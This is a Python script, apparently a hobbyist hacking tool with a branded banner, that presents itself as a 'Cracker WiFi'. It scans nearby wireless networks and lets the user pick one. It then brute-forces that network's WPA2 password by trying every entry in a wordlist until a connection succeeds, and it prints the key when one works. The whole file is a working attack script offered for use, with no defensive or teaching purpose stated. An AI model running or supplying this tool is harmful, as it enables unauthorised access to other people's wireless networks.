from pywifi import const, PyWiFi ,Profile
from time import sleep
from winsound import Beep # just for Windows
import os

os.system("cls")
print("""
 __   __ _          __  __      
 |  \/  | |__  _ __ \ \/ /_ __  
 | |\/| | '_ \| '_ \ \  /| '_ \ 
 | |  | | | | | | | |/  \| |_) |
 |_|  |_|_| |_|_| |_/_/\_\ .__/ 
                         |_|     version 1.0""")
sleep(0.1)
print("""
------------------------------------------------------
|||           Developer: MahanXp              |||
|||           Contact: Tel: @MaHaN_UniQuE     |||               
------------------------------------------------------             
""")
sleep(0.1)
print("[1]--Cracker WiFi")
sleep(0.1)
print('')
print("[2]--LOGOUT")
sleep(0.1)
print("")


number = input("[Number >>> ")

if "1" in number:

    print("<< Hello WelCome To Cracker WiFi >>")

    def scan(): # For Scan the area
        interface.scan()
        sleep(8)
        result = interface.scan_results()
        return result

    def testwifi(ssid , password):
        interface.disconnect()
        profile = Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password
        interface.connect(interface.add_network_profile(profile))
        sleep(1)
        if interface.status() == const.IFACE_CONNECTED:
            interface.remove_network_profile(profile)
            return True
        else:
            interface.remove_network_profile(profile)
            return False
            
            
    wifi = PyWiFi() # Wifi Object
    interface = wifi.interfaces()[0] # Select First Wireless Interface CARD
    print("< Enter The List Password Name To Crack PassWord >")
    print("<<< Please Enter The List Password File In The Tool Path And Enter Its Name >>>")
    passlist = input("<<Enter The PassWord List To Crack WiFi : ") # Password List

    print("<<Scanning ... ")
    APs = scan()

    for i in range(len(APs)):
        print("{} - {}".format(i+1 ,APs[i].ssid))

    index = int(input("\n>> "))
    target = APs[index-1]

    for password in open(passlist):
        password = password.strip("\n")
        print("Testing : {}".format(password))
        if testwifi(target.ssid , password) : # Test for connection using password
            Beep(700 , 500) # Boooooghhh (just for windows)
            Beep(1000 , 500) # BOOOOOOGHHHHHHH :|  (just for windows)
            print("-" *30)
            print("PASSWORD : {}".format(password))
            print("-" *30)
            break

    input()   
if "2" in number:
    print("Good Bay ...")